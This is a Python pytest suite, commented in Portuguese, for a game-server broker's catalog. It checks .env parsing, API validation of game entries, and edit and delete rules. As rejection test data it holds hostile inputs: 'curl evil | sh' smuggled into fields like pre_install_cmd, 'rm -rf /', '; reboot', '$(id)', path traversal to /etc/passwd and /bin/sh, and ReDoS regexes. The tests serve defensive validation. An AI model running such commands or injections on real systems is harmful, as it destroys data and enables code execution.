"""Catalogo: leitura do .env sem shell e validacao dos jogos cadastrados pela API."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

import gamebroker.services.catalog as cat
from gamebroker.domain.exceptions import Conflict, NotFound, ValidationError

RAIZ = Path(__file__).resolve().parents[3]


# --- parser do .env -------------------------------------------------------

def test_env_le_valores_simples_e_ignora_comentarios():
    data = cat.read_env('# cabecalho\nA=1\nB="dois palavras"  # nota\nC=tres # nota\n\nD=\n')
    assert data == {"A": "1", "B": "dois palavras", "C": "tres", "D": ""}


def test_env_nao_expande_nada():
    data = cat.read_env('X="-a $(id) `whoami` $HOME"\n')
    assert data["X"] == "-a $(id) `whoami` $HOME"


def test_env_aspas_simples_multilinha_e_apostrofo_escapado():
    text = "PRE='\necho \"oi\"\necho it'\\''s ok\n'\nDEPOIS=1\n"
    data = cat.read_env(text)
    assert "echo it's ok" in data["PRE"]
    assert data["DEPOIS"] == "1", "a linha depois do bloco multilinha continua sendo lida"


def test_env_aspas_duplas_com_escape():
    assert cat.read_env(r'A="uma \"citacao\" e \$var"')["A"] == 'uma "citacao" e $var'


def test_env_aspas_sem_fechar_e_erro():
    with pytest.raises(ValueError, match="aspas sem fechar"):
        cat.read_env("A='abc\nB=1\n")


# --- catalogo curado (arquivos reais do repositorio) -----------------------

def test_todos_os_env_do_repo_sao_lidos_sem_erro():
    games, errors = cat.load_curated(RAIZ / "games")
    assert errors == []
    assert "palworld" in games


def test_palworld_e_criavel_e_dayz_nao():
    games, _ = cat.load_curated(RAIZ / "games")
    assert games["palworld"].creatable
    assert cat.Port(8211, "udp") in games["palworld"].ports
    assert not games["dayz"].creatable
    assert "conta Steam" in games["dayz"].reason


def test_instalador_proprio_nao_sai_pelo_broker():
    """Nenhum jogo do repositorio usa PROVISION_SCRIPT hoje (o TeamSpeak saiu), mas a regra
    continua: um instalador que nao e SteamCMD nao roda pelo ct-install.sh do broker."""
    game = cat.game_from_env("voz", {"GAME_KEY": "voz", "STEAM_APP_ID": "1", "GAME_PORT": "9987",
                                    "GAME_PORTS": "9987/udp", "PROVISION_SCRIPT": "provision-voz.sh"})
    assert not game.creatable
    assert "instalador proprio" in game.reason


def test_hooks_do_curado_nunca_aparecem_na_api():
    games, _ = cat.load_curated(RAIZ / "games")
    palworld = games["palworld"]
    assert palworld.has_hooks
    as_public = json.dumps(palworld.as_public())
    assert "steamclient" not in as_public
    assert "install" not in as_public.lower()


def test_arquivo_ruim_vira_erro_e_nao_derruba_o_resto(tmp_path):
    (tmp_path / "bom.env").write_text("GAME_KEY=bom\nSTEAM_APP_ID=1\nGAME_PORTS=7000/udp\n")
    (tmp_path / "ruim.env").write_text("GAME_KEY=Ruim_Chave\n")
    games, errors = cat.load_curated(tmp_path)
    assert list(games) == ["bom"]
    assert len(errors) == 1
    assert "ruim.env" in errors[0]


# --- validacao do jogo dinamico --------------------------------------------

def test_jogo_dinamico_valido(game_data):
    game = cat.validate_dynamic(game_data)
    assert game.creatable
    assert game.source == cat.SOURCE_DYNAMIC
    assert not game.has_hooks
    assert game.ports == (cat.Port(7777, "udp"), cat.Port(27016, "udp"))


def test_ida_e_volta_pelo_formato_gravado(game_data):
    game = cat.validate_dynamic(game_data)
    assert cat.validate_dynamic(game.as_stored()) == game


INVALID_CASES = [
    # comando de shell escondido em argumento
    ("start_args", "-x; rm -rf /"), ("start_args", "$(id)"), ("start_args", "`id`"),
    ("start_args", "a | b"), ("start_args", "a && b"), ("start_args", "-p {OUTRO}"),
    ("start_args", "a\nb"), ("start_args", "x" * 301),
    # caminhos
    ("start_script", "../../bin/sh"), ("start_script", "/bin/sh"), ("start_script", "a b"),
    ("config_path", "/etc"), ("config_path", "/opt/game/../../etc"),
    ("config_files", ["/etc/passwd"]), ("config_files", "nao-e-lista"),
    ("backup_paths", ["/opt/game/.."]), ("log_path", "/var/log/x"),
    # identidade
    ("key", "Bad_Key"), ("key", "a"), ("key", "x" * 30), ("key", "a;b"),
    ("name", "x;y"), ("name", ""), ("name", "n" * 41),
    # numeros
    ("app_id", "123"), ("app_id", True), ("app_id", 0), ("app_id", 2**31),
    ("memory_mb", 10**9), ("cores", True), ("disk_gb", 1),
    # portas
    ("ports", []), ("ports", ["80/tcp"]), ("ports", ["1023/udp"]), ("ports", ["8080/tcp"]),
    ("ports", ["8006/tcp"]), ("ports", ["25575/tcp"]), ("ports", ["99999/udp"]),
    ("ports", ["7777/udp", "7777/udp"]), ("ports", ["7777"]), ("ports", ["7777/icmp"]),
    ("game_port", 9999), ("query_port", 1234),
    # enums
    ("platform", "freebsd"), ("player_source", "http"), ("recipes", ["rm -rf /"]),
    ("shiftable", "sim"),
    # regex do log
    ("join_re", "(a+)+$"), ("join_re", "(.*)*x"), ("join_re", "(a|b*)+"), ("join_re", "x" * 201),
    ("join_re", "("),
]


@pytest.mark.parametrize(("field", "value"), INVALID_CASES, ids=lambda v: repr(v)[:30])
def test_campo_invalido_e_recusado(game_data, field, value):
    game_data[field] = value
    with pytest.raises(ValidationError) as error:
        cat.validate_dynamic(game_data)
    assert field in str(error.value)


@pytest.mark.parametrize(("changes", "chunk"), [
    ({"ports": ["7777/udp", "27016/udp", "2303/udp", "2304/udp"]}, "mais portas"),
    ({"start_args": "-log"}, "{PORT}"),
    ({"start_args": "-port={PORT}"}, "{QUERY_PORT}"),
])
def test_deslocavel_exige_que_o_jogo_receba_todas_as_portas(game_data, changes, chunk):
    """Sem isso o firewall abriria uma porta que o jogo nao escuta (ou uma que ele ignora)."""
    game_data.update(changes)
    with pytest.raises(ValidationError, match="shiftable") as error:
        cat.validate_dynamic(game_data)
    assert chunk in str(error.value)


def test_jogo_fixo_pode_ter_portas_extras_e_nenhum_marcador(game_data):
    game_data.update(ports=["7777/udp", "27016/udp", "2303/udp"], start_args="-log", shiftable=False)
    assert cat.validate_dynamic(game_data).shiftable is False


def test_jogo_curado_deslocavel_sem_marcador_vira_erro_do_catalogo(tmp_path):
    (tmp_path / "ruim.env").write_text(
        'GAME_KEY=ruim\nSTEAM_APP_ID=1\nGAME_PORT=7001\nGAME_PORTS="7001/udp"\nPORTS_SHIFTABLE=1\n', encoding="utf-8")
    games, errors = cat.load_curated(tmp_path)
    assert games == {}
    assert "PORTS_SHIFTABLE" in errors[0]
    assert "{PORT}" in errors[0]


@pytest.mark.parametrize("field", ["pre_install_cmd", "post_install_cmd", "provision_script", "PRE_INSTALL_CMD", "x"])
def test_campo_desconhecido_e_recusado_para_nao_entrar_comando_de_contrabando(game_data, field):
    game_data[field] = "curl evil | sh"
    with pytest.raises(ValidationError, match="desconhecido"):
        cat.validate_dynamic(game_data)


@pytest.mark.parametrize("body", [None, [], "texto", 7])
def test_corpo_que_nao_e_objeto_e_recusado(body):
    with pytest.raises(ValidationError, match="objeto JSON"):
        cat.validate_dynamic(body)


@pytest.mark.parametrize("field", ["key", "name", "app_id", "ports", "game_port"])
def test_campo_obrigatorio_ausente(game_data, field):
    del game_data[field]
    with pytest.raises(ValidationError, match="obrigatorio"):
        cat.validate_dynamic(game_data)


def test_jogo_de_windows_exige_receita_de_windows(game_data):
    game_data["platform"] = "windows"
    game_data["recipes"] = []
    with pytest.raises(ValidationError, match="wine"):
        cat.validate_dynamic(game_data)
    game_data["recipes"] = ["wine"]
    assert cat.validate_dynamic(game_data).recipes == ("wine",)


def test_so_o_minimo_basta(game_data):
    minimum = {k: game_data[k] for k in ("key", "name", "app_id", "ports", "game_port")}
    game = cat.validate_dynamic(minimum)
    assert (game.memory_mb, game.cores, game.disk_gb) == (4096, 2, 20)
    assert game.player_source == "log"


# --- Catalogo (curado + dinamico) -------------------------------------------

def test_catalogo_lista_curados_menos_o_template(catalog):
    assert [j.key for j in catalog.list_all()] == ["alfa", "beta", "conta", "delta"]


def test_adicionar_persiste_e_sobrevive_a_recarga(catalog, game_data, tmp_path):
    catalog.add_dynamic(game_data)
    other = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
    assert other.get("meujogo").name == "Meu Jogo"
    assert other.errors == []


def test_adicionar_chave_de_jogo_curado_e_conflito(catalog, game_data):
    game_data["key"] = "alfa"
    with pytest.raises(Conflict):
        catalog.add_dynamic(game_data)


def test_adicionar_duas_vezes_e_conflito(catalog, game_data):
    catalog.add_dynamic(game_data)
    with pytest.raises(Conflict):
        catalog.add_dynamic(game_data)


def test_jogo_recusado_nao_deixa_arquivo(catalog, game_data, tmp_path):
    game_data["start_args"] = "; reboot"
    with pytest.raises(ValidationError):
        catalog.add_dynamic(game_data)
    assert list((tmp_path / "dinamico").glob("*")) == []


def test_arquivo_adulterado_em_disco_nao_vira_jogo(catalog, game_data, tmp_path):
    catalog.add_dynamic(game_data)
    file_path = tmp_path / "dinamico" / "meujogo.json"
    tampered = json.loads(file_path.read_text())
    tampered["pre_install_cmd"] = "curl evil | sh"
    file_path.write_text(json.dumps(tampered))
    other = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
    with pytest.raises(NotFound):
        other.get("meujogo")
    assert any("meujogo.json" in e for e in other.errors)


def test_arquivo_com_nome_diferente_da_chave_e_ignorado(catalog, game_data, tmp_path):
    catalog.add_dynamic(game_data)
    (tmp_path / "dinamico" / "meujogo.json").rename(tmp_path / "dinamico" / "outro.json")
    other = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
    with pytest.raises(NotFound):
        other.get("meujogo")


def test_jogo_desconhecido(catalog):
    with pytest.raises(NotFound):
        catalog.get("nao-existe")


# --- Editar e apagar ------------------------------------------------------------------

def test_editar_dinamico_troca_os_dados_e_sobrevive_a_recarga(catalog, game_data, tmp_path):
    catalog.add_dynamic(game_data)
    catalog.update("meujogo", {**game_data, "name": "Outro Nome", "memory_mb": 8192})
    other = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
    assert (other.get("meujogo").name, other.get("meujogo").memory_mb) == ("Outro Nome", 8192)


def test_editar_nao_troca_a_chave(catalog, game_data):
    catalog.add_dynamic(game_data)
    with pytest.raises(ValidationError, match="key"):
        catalog.update("meujogo", {**game_data, "key": "outro"})


def test_editar_passa_pela_mesma_validacao_de_adicionar(catalog, game_data):
    catalog.add_dynamic(game_data)
    with pytest.raises(ValidationError):
        catalog.update("meujogo", {**game_data, "post_install_cmd": "curl evil | sh"})
    assert catalog.get("meujogo").name == "Meu Jogo", "a recusa nao gravou nada"


def test_editar_jogo_que_nao_existe(catalog, game_data):
    with pytest.raises(NotFound):
        catalog.update("meujogo", game_data)


def _alfa_data(**changes) -> dict:
    data = {"key": "alfa", "name": "Alfa Editado", "app_id": 1001, "ports": ["7001/udp", "7002/udp"],
            "game_port": 7001, "query_port": 7002, "start_script": "alfa.sh", "start_args": "-port={PORT}"}
    return {**data, **changes}


def test_editar_curado_troca_os_dados_e_mantem_o_shell_do_arquivo(catalog, tmp_path):
    catalog.update("alfa", _alfa_data())
    for current in (catalog.get("alfa"), cat.Catalog(tmp_path / "games", tmp_path / "dinamico").get("alfa")):
        assert current.name == "Alfa Editado"
        assert (current.source, current.edited) == (cat.SOURCE_CURATED, True)
        assert "segredo do instalador" in current.post_install, "o POST_INSTALL do .env continua valendo"
    assert "segredo" not in str(catalog.stored("alfa")), "o formulario de edicao nunca ve o shell"


def test_apagar_curado_editado_devolve_o_do_arquivo(catalog, tmp_path):
    catalog.update("alfa", _alfa_data())
    restored = catalog.remove("alfa")
    assert restored is not None
    assert (catalog.get("alfa").name, catalog.get("alfa").edited) == ("Alfa", False)
    assert list((tmp_path / "dinamico").glob("*.json")) == []


def test_curado_sem_edicao_nao_se_apaga_pela_api(catalog):
    with pytest.raises(Conflict, match=r"games/alfa\.env"):
        catalog.remove("alfa")
    assert catalog.get("alfa")


def test_curado_que_o_broker_nao_cria_nao_se_edita(catalog):
    data = {"key": "conta", "name": "Conta", "app_id": 1004, "ports": ["7200/udp"], "game_port": 7200}
    with pytest.raises(Conflict):
        catalog.update("conta", data)


def test_apagar_dinamico_some_de_vez(catalog, game_data, tmp_path):
    catalog.add_dynamic(game_data)
    assert catalog.remove("meujogo") is None
    with pytest.raises(NotFound):
        catalog.get("meujogo")
    with pytest.raises(NotFound):
        cat.Catalog(tmp_path / "games", tmp_path / "dinamico").get("meujogo")


@pytest.mark.parametrize("key", ["../alfa", "a/b", "", "A"])
def test_chave_que_nao_e_chave_nao_vira_caminho(catalog, key, game_data):
    with pytest.raises(ValidationError, match="key"):
        catalog.remove(key)
    with pytest.raises(ValidationError):
        catalog.update(key, game_data)


def test_todo_curado_editavel_salva_do_jeito_que_abre(tmp_path):
    """Abrir a edicao e salvar sem mudar nada tem de passar. O Dragonwilds nao passava:
    "RuneScape: Dragonwilds" tem dois-pontos, e o validador de jogo usava a regex do nome
    de INSTANCIA ("name: formato invalido")."""
    catalog = cat.Catalog(RAIZ / "games", tmp_path / "dinamico")
    for game in catalog.list_all():
        if game.creatable:
            assert catalog.update(game.key, game.as_stored()).edited, game.key


def test_nenhum_curado_anda_de_porta():
    """Decisao: curado fica na porta padrao do jogo. Os marcadores continuam no START_ARGS."""
    games, _ = cat.load_curated(RAIZ / "games")
    assert [k for k, g in games.items() if g.shiftable] == []


@pytest.mark.parametrize("name", ["RuneScape: Dragonwilds", "Don't Starve", "Rock & Stone (PvE)!"])
def test_nome_de_jogo_aceita_pontuacao_de_titulo(game_data, name):
    assert cat.validate_dynamic({**game_data, "name": name}).name == name


@pytest.mark.parametrize("name", ["100% Orange", 'Aspas "x"', "Custa $5", "a`b", "a\b", "linha\nnova"])
def test_nome_de_jogo_recusa_o_que_quebra_systemd_ou_shell(game_data, name):
    """O nome vai para o Description= da unit (% e especificador do systemd) e para o install.env."""
    with pytest.raises(ValidationError, match="name"):
        cat.validate_dynamic({**game_data, "name": name})


# --- jogo que exige conta Steam (DayZ) --------------------------------------------------

def test_jogo_com_conta_so_e_criavel_quando_o_broker_tem_a_conta(tmp_path, games_dir):
    without_account = cat.Catalog(games_dir, tmp_path / "a").get("conta")
    assert not without_account.creatable
    assert "STEAM_USER/STEAM_PASS" in without_account.reason, "o motivo diz o que configurar"
    with_account = cat.Catalog(games_dir, tmp_path / "b", steam_account=True).get("conta")
    assert with_account.creatable
    assert with_account.needs_account


def test_conta_nao_torna_criavel_quem_tem_outro_motivo():
    game = cat.game_from_env("voz", {"GAME_KEY": "voz", "STEAM_APP_ID": "1", "GAME_PORT": "9987",
                                    "GAME_PORTS": "9987/udp", "PROVISION_SCRIPT": "x.sh"}, steam_account=True)
    assert not game.creatable


def test_o_dayz_do_repositorio_sai_criavel_com_conta():
    games, _ = cat.load_curated(RAIZ / "games", steam_account=True)
    assert games["dayz"].creatable and games["dayz"].needs_account


def test_jogo_da_api_nunca_pede_a_conta(game_data):
    """So o curado, revisado no git, leva a senha da conta Steam para dentro de um CT."""
    assert not cat.validate_dynamic(game_data).needs_account
    with pytest.raises(ValidationError):
        cat.validate_dynamic({**game_data, "needs_account": True})


def test_edicao_do_curado_mantem_a_exigencia_da_conta(tmp_path, games_dir):
    catalog = cat.Catalog(games_dir, tmp_path / "d", steam_account=True)
    data = {"key": "conta", "name": "Conta Editada", "app_id": 1004, "ports": ["7200/udp"], "game_port": 7200}
    assert catalog.update("conta", data).needs_account
